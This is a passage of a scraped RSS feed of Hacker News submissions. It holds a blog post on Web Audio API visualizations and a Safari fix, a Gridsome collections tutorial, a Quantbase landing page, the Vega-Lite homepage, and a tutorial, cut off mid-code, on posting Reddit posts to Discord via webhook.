<p>To create audio visualizations, the first thing you‚Äôll need is an <code>AnalyserNode</code>, which you can get from the <code>createAnalyser</code> method of a <code>BaseAudioContext</code>. You can get both of these things pretty easily<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> like this:</p>
<pre><span>1</span><span>const</span> audioContext <span>=</span> <span>new</span> <span>window</span>.AudioContext();
<span>2</span><span>const</span> analyser <span>=</span> audioContext.createAnalyser();
</pre><p>Next, create a <code>MediaStreamAudioSourceNode</code> from an existing data stream (I use either the local or remote data streams from either <code>getUserMedia</code> or from the ‚Äòtrack‚Äô event of <code>RTCPeerConnection</code> respectively) using <code>AudioContext.createMediaStreamSource</code>. Then you can connect that audio source to the analyser object like this:</p>
<pre><span>1</span><span>const</span> audioSource <span>=</span> <span>this</span>.audioContext.createMediaStreamSource(stream);
<span>2</span>audioSource.connect(analyser);
</pre>
<h2>Using requestAnimationFrame</h2>
<p><code>window.requestAnimationFrame</code> is nice. Call it, passing in your drawing function, and then inside that function call <code>requestAnimationFrame</code> again. Get yourself a nice little recursive loop going that‚Äôs automatically timed properly by the browser.</p>
<p>In my situation, there will either be 0, 1, or 2 visualizations running, since either side can choose either video chat, audio-only (‚Ä¶except during screen sharing), or just text chat. So I have one loop that draws both. It looks like this:</p>
<pre><span>1</span><span>const</span> drawAudioVisualizations <span>=</span> () =&gt; {
<span>2</span>    audioCancel <span>=</span> <span>window</span>.requestAnimationFrame(drawAudioVisualizations);
<span>3</span>    localAudioVisualization.draw();
<span>4</span>    remoteAudioVisualization.draw();
<span>5</span>};
</pre><p>I created the class for those visualization objects, and they handle whether or not to draw. They each contain the analyser, source, and context objects for their visualization.</p>
<p>Then when I detect that loop doesn‚Äôt have to run anymore, I can cancel it using that <code>audioCancel</code> value:</p>
<pre><span>1</span><span>window</span>.cancelAnimationFrame(audioCancel);
<span>2</span>audioCancel <span>=</span> <span>0</span>;
</pre>
<h2>Configuring the Analyser</h2>
<p>Like in the <a href="https://github.com/mdn/voice-change-o-matic/blob/gh-pages/scripts/app.js">example you‚Äôll see a lot</a> if you look at the MDN documentation for this stuff, I provide options for two audio visualizations: frequency bars and a sine wave. Here‚Äôs how I configure the analyser for each type:</p>
<pre><span> 1</span><span>switch</span> (<span>this</span>.type) {
<span> 2</span>    <span>case</span> <span>'frequencybars'</span><span>:</span>
<span> 3</span>        <span>this</span>.analyser.minDecibels <span>=</span> <span>-</span><span>90</span>;
<span> 4</span>        <span>this</span>.analyser.maxDecibels <span>=</span> <span>-</span><span>10</span>;
<span> 5</span>        <span>this</span>.analyser.smoothingTimeConstant <span>=</span> <span>0.85</span>;
<span> 6</span>        <span>this</span>.analyser.fftSize <span>=</span> <span>256</span>;
<span> 7</span>        <span>this</span>.bufferLength <span>=</span> <span>this</span>.analyser.frequencyBinCount;
<span> 8</span>        <span>this</span>.dataArray <span>=</span> <span>new</span> Uint8Array(<span>this</span>.bufferLength);
<span> 9</span>        <span>break</span>;
<span>10</span>    <span>default</span><span>:</span>
<span>11</span>        <span>this</span>.analyser.minDecibels <span>=</span> <span>-</span><span>90</span>;
<span>12</span>        <span>this</span>.analyser.maxDecibels <span>=</span> <span>-</span><span>10</span>;
<span>13</span>        <span>this</span>.analyser.smoothingTimeConstant <span>=</span> <span>0.9</span>;
<span>14</span>        <span>this</span>.analyser.fftSize <span>=</span> <span>1024</span>;
<span>15</span>        <span>this</span>.bufferLength <span>=</span> <span>this</span>.analyser.fftSize;
<span>16</span>        <span>this</span>.dataArray <span>=</span> <span>new</span> Uint8Array(<span>this</span>.bufferLength);
<span>17</span>        <span>break</span>;
<span>18</span>}
</pre><div><p>I‚Äôve adjusted these numbers a lot, and I‚Äôm gonna keep doing it. A note about <code>fftSize</code> and <code>frequencyBinCount</code>: <code>frequencyBinCount</code> is set right after you set <code>fftSize</code> and it‚Äôs usually just half the <code>fftSize</code> value. These values are about the amount of data you want to receive from the main analyser functions I‚Äôm about to talk about next. As you can see, they directly control the size of the data array that you‚Äôll use to store the audio data on each draw call.
</p></div>
<h2>Using the Analyser</h2>
<p>On each draw call, depending on the type of visualization, call either <code>getByteFrequencyData</code> or <code>getByteTimeDomainData</code> with the array that was created above, and it‚Äôll be filled with data. Then you run a simple loop over each element and start drawing. Here‚Äôs my sine wave code:</p>
<pre><span> 1</span><span>this</span>.analyser.getByteTimeDomainData(<span>this</span>.dataArray);
<span> 2</span><span>this</span>.ctx.lineWidth <span>=</span> <span>2</span>;
<span> 3</span><span>this</span>.ctx.strokeStyle <span>=</span> audioSecondaryStroke;
<span> 4</span>
<span> 5</span><span>this</span>.ctx.beginPath();
<span> 6</span>
<span> 7</span><span>let</span> v, y;
<span> 8</span><span>for</span> (<span>let</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>this</span>.bufferLength; i<span>++</span>) {
<span> 9</span>    v <span>=</span> <span>this</span>.dataArray[i] <span>/</span> <span>128.0</span>;
<span>10</span>    y <span>=</span> v <span>*</span> height <span>/</span> <span>2</span>;
<span>11</span>
<span>12</span>    <span>if</span> (i <span>===</span> <span>0</span>) {
<span>13</span>        <span>this</span>.ctx.moveTo(x, y);
<span>14</span>    } <span>else</span> {
<span>15</span>        <span>this</span>.ctx.lineTo(x, y);
<span>16</span>    }
<span>17</span>
<span>18</span>    x <span>+=</span> width <span>*</span> <span>1.0</span> <span>/</span> <span>this</span>.bufferLength;
<span>19</span>}
<span>20</span>
<span>21</span><span>this</span>.ctx.lineTo(width, height <span>/</span> <span>2</span>);
<span>22</span><span>this</span>.ctx.stroke();
</pre><div><p>The fill and stroke colors are dynamic based on the website color scheme.
</p></div>
<h2>Good ol' Safari</h2>
<p>So I did all of this stuff I just talked about, but for <strong>days</strong> I could <em>not</em> get this to work in Safari. Not because of errors or anything, but because both <code>getByteFrequencyData</code> and <code>getByteTimeDomainData</code> just filled the array with 0s every time. No matter what I did. I was able to get the audio data in Firefox just fine.</p>
<p>So at first, I figured it just didn‚Äôt work at all in Safari and I would just have to wait until Apple fixed it. But then I came across <a href="https://mdn.github.io/voice-change-o-matic/">this sample audio project</a> and noticed it worked just fine in Safari.</p>
<div><p>So I studied the code for an hour trying to understand what was different about my code and theirs. I made a lot of changes to my code to make it more like what they were doing. One of the big differences is that they‚Äôre connecting the audio source to different audio distortion nodes to actually change the audio. I just want to create a visualization so I wasn‚Äôt using any of those objects.
</p></div>
<h3>Audio Distortion Effects</h3>
<p>The <code>BaseAudioContext</code> has a few methods you can use to create audio distortion objects.</p>
<ul>
<li><code>WaveShaperNode</code>: Use <code>BaseAudioContext.createWaveShaper</code> to create a non-linear distortion. You can use a custom function to change the audio data.</li>
<li><code>GainNode</code>: Use <code>BaseAudioContext.createGain</code> to control the overall gain (volume) of the audio.</li>
<li><code>BiquadFilterNode</code>: Use <code>BaseAudioContext.createBiquadFilter</code> to apply some common audio effects.</li>
<li><code>ConvolverNode</code>: Use <code>BaseAudioContext.createConvolver</code> to apply reverb effects to audio.</li>
</ul>
<p>Each one of these objects has a <code>connect</code> function where you pass another context, output, or filter. Each one has a certain number of inputs and outputs. Here‚Äôs an example from that sample project of connecting all of them:</p>
<pre><span>1</span>source <span>=</span> audioCtx.createMediaStreamSource(stream);
<span>2</span>source.connect(distortion);
<span>3</span>distortion.connect(biquadFilter);
<span>4</span>biquadFilter.connect(gainNode);
<span>5</span>convolver.connect(gainNode);
<span>6</span>gainNode.connect(analyser);
<span>7</span>analyser.connect(audioCtx.destination);
</pre><p><strong>Note</strong>: Don‚Äôt connect to your audio context <code>destination</code> if you‚Äôre just trying to create a visualization for a call. The user will hear themselves talking.</p>
<div><p>Anyway, I tried adding these things to my code to see if that would get it working in Safari, but I had no luck.
</p></div>
<h2>Figuring out the Safari issue</h2>
<p>I was starting to get <em>real</em> frustrated trying to figure this out. I was gonna let it go when I thought Safari was just broken (because it usually is), but since I knew it <em>could</em> work in Safari, I couldn‚Äôt leave it alone.</p>
<p>Eventually I downloaded the actual HTML and Javascript files from that sample and started removing shit from their code, running it locally and seeing if it worked. Which it did. So now I‚Äôm editing my own code, and <em>their code</em>, to get them to be pretty much the same. Which I did. And <strong>still</strong> theirs worked and mine didn‚Äôt.</p>
<p>Next I just started desperately logging every single object at different points in my code to figure out what the fuck was going on. Then I noticed something.</p>
<div><p><img src="https://media.dwayne.xyz/blog/audio-context-suspended.png" alt="Dev console showing the output of logging this.audioContext. The state attribute is shown as suspended"></p><p>Output of logging the audio context object.</p></div>
<p>The <code>state</code> is ‚Äúsuspended‚Äù? Why? I don‚Äôt know. I did the same log in the sample code (that I had downloaded and was running on my machine) and it was ‚Äúrunning‚Äù.</p>
<p>This is the code that fixes it:</p>
<pre><span>1</span><span>this</span>.audioSource <span>=</span> <span>this</span>.audioContext.createMediaStreamSource(<span>this</span>.stream);
<span>2</span><span>this</span>.audioSource.connect(<span>this</span>.analyser);
<span>3</span><span>this</span>.audioContext.resume(); <span>// Why??????
</span></pre><div><p>Calling <code>resume</code> changes the state and then everything works. To this day I still don‚Äôt know why the sample code didn‚Äôt need that line.
</p></div>
<h2>Drawing the image and supporting light/dark modes</h2>
<p>Like everything else on my site, all of this must support different color schemes (and screen sizes, and mobile devices). That was surprisingly difficult when trying to draw an SVG on the canvas.</p>
<p>I‚Äôm using <a href="https://fontawesome.com/">FontAwesome</a> for all my icons on the site. I wanted to use one of them for these visualizations. The FontAwesome files are all SVGs (which is great), but I didn‚Äôt know how to draw the image in different colors in Javascript. The way I decided to do this was to load the SVG file into a Javascript <code>Image</code> object, then draw that onto the canvas each draw call.</p>
<p>That worked, but it only drew it black even after changing the fill and stroke colors. So after some web searching I read about someone deciding to draw out an image on an offscreen canvas, reading all the image data, and ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dwayne.xyz/post/audio-visualizations-web-audio-api">https://dwayne.xyz/post/audio-visualizations-web-audio-api</a></em></p>]]>
            </description>
            <link>https://dwayne.xyz/post/audio-visualizations-web-audio-api</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938292</guid>
            <pubDate>Fri, 30 Oct 2020 01:55:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Create Collections from API with Gridsome]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938194">thread link</a>) | @phongduong
<br/>
October 29, 2020 | https://phongduong.dev/blog/create-collections-from-api-with-gridsome/ | <a href="https://web.archive.org/web/*/https://phongduong.dev/blog/create-collections-from-api-with-gridsome/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Gridsome provides many source plugins that help you create collections from your source. But if you want to create collections from your API or a third-party API, you have to create collections manually. </p>
<p>In <code>gridsome.server.js</code> file, you call <code>loadSource</code> method of <code>api</code> parameter. You pass a callback function which you will fetch the API and create collections from data.</p>
<p>Your callback has an <code>actions</code> parameter, it has <code>addCollection</code> method. You will use this method to create your collections</p>
<pre><code><span>const</span> axios <span>=</span> <span>require</span><span>(</span><span>"axios"</span><span>)</span>

module<span>.</span><span>exports</span> <span>=</span> <span>function</span><span>(</span><span>api</span><span>)</span> <span>{</span>
  api<span>.</span><span>loadSource</span><span>(</span><span>actions</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>{</span> data <span>}</span> <span>=</span> <span>await</span> axios<span>.</span><span>get</span><span>(</span><span>'https://example.com/api/v1/posts'</span><span>)</span>
    <span>const</span> postCollection <span>=</span> actions<span>.</span><span>addCollection</span><span>(</span><span>"Post"</span><span>)</span>
    
    <span>for</span><span>(</span><span>const</span> post <span>of</span> data<span>)</span> <span>{</span>
      postCollection<span>.</span><span>addNode</span><span>(</span><span>{</span>
        id<span>:</span> post<span>.</span><span>id</span><span>,</span>
        title<span>:</span> post<span>.</span><span>title</span>
      <span>}</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span><span>;</span></code></pre>
<p>After you start the server, it will create <code>Post</code> collection. To get the collection, you call <code>getCollection</code> method with the collection's name</p>
<pre><code>actions<span>.</span><span>getCollection</span><span>(</span><span>"Post"</span><span>)</span></code></pre>
</div></div>]]>
            </description>
            <link>https://phongduong.dev/blog/create-collections-from-api-with-gridsome/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938194</guid>
            <pubDate>Fri, 30 Oct 2020 01:32:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quantbase ‚Äì Deploy your own algo trader in 5 minutes with 0 code]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938082">thread link</a>) | @tjs8rj
<br/>
October 29, 2020 | https://areyouinterested.co/site/quantbase/ | <a href="https://web.archive.org/web/*/https://areyouinterested.co/site/quantbase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="hero-1"><p id="subheading">Deploy algorithms from top hedge funds,<br> rank and use 100s of users‚Äô algorithms,<br> or create new algo-traders effortlessly</p>

              <div id="interested">
                <h3>Are you interested?</h3>
                <div id="buttons">
                  <p><a href="https://areyouinterested.co/site/quantbase/yes" id="yes">Yes</a>
                  <a href="https://areyouinterested.co/site/quantbase/no" id="no">No</a>
                </p></div>
              </div>

            </div></div>]]>
            </description>
            <link>https://areyouinterested.co/site/quantbase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938082</guid>
            <pubDate>Fri, 30 Oct 2020 01:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vega-Lite: A Grammar of Interactive Graphics]]>
            </title>
            <description>
<![CDATA[
Score 223 | Comments 50 (<a href="https://news.ycombinator.com/item?id=24937954">thread link</a>) | @tosh
<br/>
October 29, 2020 | https://vega.github.io/vega-lite/ | <a href="https://web.archive.org/web/*/https://vega.github.io/vega-lite/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <section>
    <p>
  <strong>Vega-Lite</strong> is a high-level grammar of interactive graphics. It provides a concise, declarative JSON syntax to create an expressive range of visualizations for data analysis and presentation.
</p>

<p><span>
  <span>
    Vega-Lite specifications describe visualizations as encoding mappings from data to <strong>properties of graphical marks</strong> (e.g., points or bars).
    The Vega-Lite compiler <strong>automatically produces visualization components</strong> including axes, legends, and scales.
    It determines default properties of these components based on a set of <strong>carefully designed rules</strong>.
    This approach allows Vega-Lite specifications to be concise for quick visualization authoring, while giving user control to override defaults and customize various parts of a visualization.
    As we also designed Vega-Lite to support data analysis, Vega-Lite supports both <strong>data transformations</strong> (e.g., aggregation, binning, filtering, sorting) and <strong>visual transformations</strong> (e.g., stacking and faceting).
    Moreover, Vega-Lite specifications can be <strong>composed</strong> into layered and multi-view displays, and made <strong>interactive with selections</strong>.
  </span>
  <span>
  <a href="https://vega.github.io/vega-lite/tutorials/getting_started.html">Get started<br><small>Latest Version: 4.17.0</small></a>
  <a href="https://vega.github.io/editor/#/custom/vega-lite">Try online</a>
  </span>
</span></p>

<p>Compared to <a href="https://vega.github.io/vega">Vega</a>, Vega-Lite provides a more concise and convenient form to author common visualizations. As Vega-Lite can compile its specifications to Vega specifications, users may use Vega-Lite as the <em>primary</em> visualization tool and, if needed, transition to use the lower-level Vega for advanced use cases.</p>

<p>For more information, read our <a href="https://medium.com/@uwdata/de6661c12d58">introduction article to Vega-Lite v2 on Medium</a>, watch our <a href="https://www.youtube.com/watch?v=9uaHRWj04D4">OpenVis Conf talk about the new features in Vega-Lite v2</a>, see the <a href="https://vega.github.io/vega-lite/docs/">documentation</a> and take a look at our <a href="https://vega.github.io/vega-lite/examples/">example gallery</a>. Follow us on <a href="https://twitter.com/vega_vis">Twitter at @vega_vis</a> to stay informed about updates.</p>

<h2 id="example">Example</h2>



<h2 id="additional-links">Additional Links</h2>

<ul>
  <li>Award winning <a href="https://idl.cs.washington.edu/papers/vega-lite">research paper</a> and <a href="https://www.youtube.com/watch?v=9uaHRWj04D4">video of our OpenVis Conf talk</a> on the design of Vega-Lite</li>
  <li>Listen to a Data Stories episode about <a href="http://datastori.es/121-declarative-visualization-with-vega-lite-and-altair-with-dominik-moritz-jacob-vanderplas-kanit-ham-wongsuphasawat/">Declarative Visualization with Vega-Lite and Altair</a>
</li>
  <li>
<a href="http://json-schema.org/">JSON schema</a> specification for <a href="https://github.com/vega/schema">Vega-Lite</a> (<a href="https://vega.github.io/schema/vega-lite/v4.json">latest</a>)</li>
  <li>Ask questions about Vega-Lite on <a href="https://stackoverflow.com/tags/vega-lite">Stack Overflow</a> or <a href="https://bit.ly/join-vega-slack-2020">Slack</a>
</li>
  <li>Fork our <a href="https://bl.ocks.org/domoritz/455e1c7872c4b38a58b90df0c3d7b1b9">Vega-Lite Block</a>, or <a href="https://beta.observablehq.com/@domoritz/vega-lite-demo">Observable Notebook</a>.</li>
</ul>

<h2 id="users">Users</h2>

<p>Vega-Lite is used by thousands of data enthusiasts, developers, journalists, data scientists, teachers, and researchers across many organizations. Here are some of them. Learn about integrations on our <a href="https://vega.github.io/vega-lite/ecosystem.html">ecosystem page</a>.</p>



<h2 id="team">Team</h2>

<p>The development of Vega-Lite is led by the alumni and members of the <a href="https://idl.cs.washington.edu/">University of Washington Interactive Data Lab</a> (UW IDL), including <a href="https://twitter.com/kanitw">Kanit ‚ÄúHam‚Äù Wongsuphasawat</a> (now at Apple), <a href="https://twitter.com/domoritz">Dominik Moritz</a> (now at CMU / Apple), <a href="https://twitter.com/arvindsatya1">Arvind Satyanarayan</a> (now at MIT), and <a href="https://twitter.com/jeffrey_heer">Jeffrey Heer</a> (UW IDL).</p>

<p>Vega-Lite gets significant contributions from its community‚Äìin particular <a href="https://willium.com/">Will Strimling</a>, <a href="https://github.com/YuhanLu">Yuhan (Zoe) Lu</a>, <a href="https://github.com/invokesus">Souvik Sen</a>, <a href="https://github.com/chanwutk">Chanwut Kittivorawong</a>, <a href="https://github.com/mattwchun">Matthew Chun</a>, <a href="https://github.com/AkshatSh">Akshat Shrivastava</a>, <a href="https://github.com/Saba9">Saba Noorassa</a>, <a href="https://github.com/sirahd">Sira Horradarn</a>, <a href="https://github.com/donghaoren">Donghao Ren</a>, and <a href="https://github.com/haldenl">Halden Lin</a>. Please see the <a href="https://github.com/vega/vega-lite/graphs/contributors">contributors page</a> for the full list of contributors.</p>

  </section>
</div></div>]]>
            </description>
            <link>https://vega.github.io/vega-lite/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937954</guid>
            <pubDate>Fri, 30 Oct 2020 00:52:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Adding a simple Reddit feed to your Discord with Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937851">thread link</a>) | @DanWritesCode
<br/>
October 29, 2020 | https://danwalker.com/python-discord-reddit-feed/ | <a href="https://web.archive.org/web/*/https://danwalker.com/python-discord-reddit-feed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <main aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>I‚Äôm a moderator of many Discords, and I run a lot of bots and scripts to help manage and improve communities. It‚Äôs pretty common for larger subreddits to have a Discord server these days, and for that reason, today we‚Äôre going to be looking at a useful feature for both users and moderators alike: adding a Reddit feed to your Discord server.</p> <h2 id="what-well-be-doing"> <a href="#what-well-be-doing"></a> What we‚Äôll be doing </h2> <p>We‚Äôre going to create a separate channel in our Discord server, and receive updates about any new posts within a given subreddit. We‚Äôll be using /r/discordapp for this post. We‚Äôll create a Python script to do the work for us, and this script will need to live somewhere (such as a <a href="https://m.do.co/c/f24e8a65668a">Digital Ocean VPS</a> - click for free credit).</p> <h3 id="create-a-discord-channel-and-webhook"> <a href="#create-a-discord-channel-and-webhook"></a> Create a Discord channel and webhook </h3> <p>For this example, we will first create a new channel called <code>#reddit-feed</code>, with read-only permissions for everyone:</p> <p><img src="https://danwalker.com/python-discord-reddit-feed/discord-new-channel.png" alt="Discord channel creation"></p> <p>Once created, open the settings page for the new channel, and then select the Integrations section from the left menu:</p> <p><img src="https://danwalker.com/python-discord-reddit-feed/webhook-create.png" alt="Discord channel editing"></p> <p>Finally, create a new webhook. You can call it whatever you‚Äôd like, I‚Äôll simply name it <code>Reddit Feed</code> for this example. Be sure to save your changes, and voila! We can visit this page any time to copy our webhook URL.</p> <p>Let‚Äôs test out our new webhook from the terminal, before we get started with code.</p> <div><div><pre><code>$ export WEBHOOK_URL="https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$ curl -X POST -H "Content-Type: application/json" -d '{"username": "Hello", "content": "World"}' $WEBHOOK_URL
</code></pre></div></div> <p>Success!</p> <p><img src="https://danwalker.com/python-discord-reddit-feed/discord-message.png" alt="Discord message"></p> <h3 id="fetching-posts"> <a href="#fetching-posts"></a> Fetching posts </h3> <p>Now let‚Äôs start our actual Python code, we‚Äôll begin by fetching a list of posts from Reddit. Luckily, Reddit makes this quite easy as you can append <code>.json</code> to most URLs to receive a JSON formatted response, for example: <code>https://www.reddit.com/r/discordapp/new/.json</code> which will return the 25 newest posts from /r/discordapp.</p> <p>Let‚Äôs fetch it with Python</p> <div><div><pre><code><span>import</span> <span>requests</span>

<span>subreddit</span> <span>=</span> <span>'discordapp'</span>

<span>req</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>f'https://www.reddit.com/r/</span><span>{</span><span>subreddit</span><span>}</span><span>/new/.json'</span><span>,</span> <span>headers</span><span>=</span><span>{</span>
    <span>"Cache-Control"</span><span>:</span> <span>"no-cache"</span><span>,</span>
    <span>"Pragma"</span><span>:</span> <span>"no-cache"</span><span>,</span>
    <span>"User-Agent"</span><span>:</span> <span>"discord-feed-bot"</span><span>})</span>

<span>posts</span> <span>=</span> <span>req</span><span>.</span><span>json</span><span>()[</span><span>'data'</span><span>][</span><span>'children'</span><span>]</span>

<span>for</span> <span>post</span> <span>in</span> <span>posts</span><span>:</span>
    <span>print</span><span>(</span><span>f"Found post: </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>]</span><span>}</span><span>"</span><span>)</span>

</code></pre></div></div> <p>First of all we load the <code>requests</code> library for fetching data from Reddit.</p> <p>Next we store the subreddit in a variable, and send a request to Reddit for the JSON of the latest posts. We use some headers here to make sure we avoid cache, and it‚Äôs also good practice to set a user-agent that identifies the creator - you could put an invite link to your Discord here, or similar.</p> <p>We then loop through the individual posts, which are stored within the <code>posts &gt; data &gt; children</code> of the returned JSON.</p> <p>Running the above should give an output similar to this:</p> <div><div><pre><code>Found post: Discord logged me out and is now telling me that my email doesn't exist
Found post: any ETA for Wayland support?
Found post: Is there a way to change a discord server's "permanent" invite link?
Found post: Discord's app breaking in an odd way. Send help.

[output truncated]
</code></pre></div></div> <h2 id="only-showing-new-posts"> <a href="#only-showing-new-posts"></a> Only showing new posts </h2> <p>Now, the problem is, every time we run the above script we will grab all the new posts, regardless of whether or not we‚Äôve seen them before. If we run this script as a one-minute cronjob, 25 posts will be repeatedly found each time.</p> <p>There are many ways to deal with this, for example if we know we‚Äôll be running this script every minute, we could check the <code>post['data']['created']</code> timestamp and check whether or not the post was created in the last minute and then display it. This approach may miss posts if our cronjob fails for any reason, or the server running it reboots, so we could use a cache instead to help get round this.</p> <p>By storing a list of post IDs we have already discovered, we can avoid sending duplicate messages, and it doesn‚Äôt matter if the script doesn‚Äôt run for a short while.</p> <h3 id="caching-locally"> <a href="#caching-locally"></a> Caching locally </h3> <p>We‚Äôll store a list of seen post IDs in a file. Let‚Äôs add a block of code at the top to check whether the file exists and load the data if so:</p> <div><div><pre><code><span>import</span> <span>json</span>

<span>try</span><span>:</span>
    <span>with</span> <span>open</span><span>(</span><span>'db.json'</span><span>)</span> <span>as</span> <span>json_file</span><span>:</span>
        <span>db</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>json_file</span><span>)</span>
<span>except</span> <span>FileNotFoundError</span><span>:</span>
    <span>db</span> <span>=</span> <span>[]</span>
</code></pre></div></div> <p>Now we have a <code>db</code> list, which is either a list of post IDs we‚Äôve already seen, or an empty list (because we haven‚Äôt seen any before). We‚Äôll add any new IDs to this list later, and save it, with this block at the end of our script:</p> <div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>'db.json'</span><span>,</span> <span>'w'</span><span>)</span> <span>as</span> <span>outfile</span><span>:</span>
    <span>json</span><span>.</span><span>dump</span><span>(</span><span>db</span><span>,</span> <span>outfile</span><span>,</span> <span>indent</span><span>=</span><span>2</span><span>)</span>
</code></pre></div></div> <h3 id="checking-whether-posts-are-unique"> <a href="#checking-whether-posts-are-unique"></a> Checking whether posts are unique </h3> <p>We only need to store a single piece of uniquely identifying information for each post, and for that we can use the <code>name</code> field which will have a format like <code>t3_abcde1</code>. Let‚Äôs modify our loop to look like this:</p> <div><div><pre><code><span>for</span> <span>post</span> <span>in</span> <span>posts</span><span>:</span>
    <span>if</span> <span>post</span><span>[</span><span>'data'</span><span>][</span><span>'name'</span><span>]</span> <span>not</span> <span>in</span> <span>db</span><span>:</span>
        <span>print</span><span>(</span><span>f"New post: </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>]</span><span>}</span><span>"</span><span>)</span>
        <span>db</span><span>.</span><span>append</span><span>(</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'name'</span><span>])</span>
</code></pre></div></div> <p>We should now have some output that looks like this:</p> <div><div><pre><code>Dans-MacBook-Pro:Desktop dwalker$ python3 test.py 
New post: Mic Distortion In Voice Calls and Mic Test
New post: Did anyone get that survey pop up?
...
[output truncated]
...
New post: Why is my phone number being listed as invalid when I have not used it for anything?
New post: Is there a way to get admin if you lost it?
Dans-MacBook-Pro:Desktop dwalker$ python3 test.py 
Dans-MacBook-Pro:Desktop dwalker$ cat db.json 
[
  "t3_jiqtfg",
  "t3_jiqoqr",
  ...
  [output truncated]
  ...
  "t3_jinmi4",
  "t3_jinbaj"
]Dans-MacBook-Pro:Desktop dwalker$ 
</code></pre></div></div> <p>Notice in the above example, on the second run of the script, no new posts were found, meaning our cache is working as expected.</p> <h3 id="limiting-the-cache-size"> <a href="#limiting-the-cache-size"></a> Limiting the cache size </h3> <p>One thing to note, as it‚Äôs good practice to always think about scaling and future growth, is that our cache will grow infinitely with post IDs. In order to fix this, we can limit how much we store in our cache.</p> <p>This is a simple fix, instead of dumping the entire <code>db</code> list to the output file, let‚Äôs just add the last 50 elements, by using <code>db[-50:]</code>. We can reference a list element from the end of a list, using negative numbers. By using a colon, we‚Äôre telling Python we want that element, and every element until the end of the list.</p> <p>Why 50? Reddit will return 25 new posts, however, if some get deleted then we may display duplicates when older posts re-appear on the <code>/new/.json</code> page, so we‚Äôll store an extra page worth as a buffer.</p> <p>Our new output block looks like:</p> <div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>'db.json'</span><span>,</span> <span>'w'</span><span>)</span> <span>as</span> <span>outfile</span><span>:</span>
    <span>json</span><span>.</span><span>dump</span><span>(</span><span>db</span><span>[</span><span>-</span><span>50</span><span>:],</span> <span>outfile</span><span>,</span> <span>indent</span><span>=</span><span>2</span><span>)</span>
</code></pre></div></div> <h2 id="posting-to-discord"> <a href="#posting-to-discord"></a> Posting to Discord </h2> <p>Now we‚Äôve got a script that works nicely in the terminal, let‚Äôs get it posting to the Discord webhook we created earlier. To create a nice embed, we‚Äôre going to use the <code>discord_webhook</code> library, which can be installed with <code>pip install discord_webhook</code> (or <code>pip3</code>, depending on your setup). We‚Äôll import the bits we need at the top of our file with:</p> <div><div><pre><code><span>from</span> <span>discord_webhook</span> <span>import</span> <span>DiscordWebhook</span><span>,</span> <span>DiscordEmbed</span>

<span>webhook_url</span> <span>=</span> <span>"https://discord.com/api/webhooks/..."</span>
</code></pre></div></div> <p>Replace the above URL with your webhook URL you created earlier.</p> <h3 id="building-the-embed"> <a href="#building-the-embed"></a> Building the embed </h3> <p>Our current loop simply prints out the name of the new post in the terminal. We could simply post the title to Discord, but Discord supports rich embeds - so why not make use of them?</p> <p>Reddit posts come in three formats: text, image, and video. We know a post is a text post if the <code>thumbnail</code> property is set to <code>self</code>. Posts also contain a handy <code>is_video</code> property which identify video posts, and if a post matches neither of these then it‚Äôs an image post.</p> <p>Unfortunately, Discord doesn‚Äôt currently support embedding videos that are playable within the chat client, so we‚Äôll use the thumbnail and add some information to show that the post is a video.</p> <div><div><pre><code><span>webhook</span> <span>=</span> <span>DiscordWebhook</span><span>(</span><span>url</span><span>=</span><span>webhook_url</span><span>)</span>

<span>permalink</span> <span>=</span> <span>f"https://www.reddit.com</span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'permalink'</span><span>]</span><span>}</span><span>"</span>

<span>if</span> <span>post</span><span>[</span><span>'data'</span><span>][</span><span>'thumbnail'</span><span>]</span> <span>==</span> <span>'self'</span><span>:</span> <span># text post
</span>    <span>embed</span> <span>=</span> <span>DiscordEmbed</span><span>(</span><span>title</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>],</span> <span>url</span><span>=</span><span>permalink</span><span>,</span> <span>description</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'selftext'</span><span>])</span>
    <span>embed</span><span>.</span><span>set_footer</span><span>(</span><span>text</span><span>=</span><span>f"Posted by </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'author'</span><span>]</span><span>}</span><span>"</span><span>)</span>

<span>elif</span> <span>post</span><span>[</span><span>'data'</span><span>][</span><span>'is_video'</span><span>]:</span> <span># video post
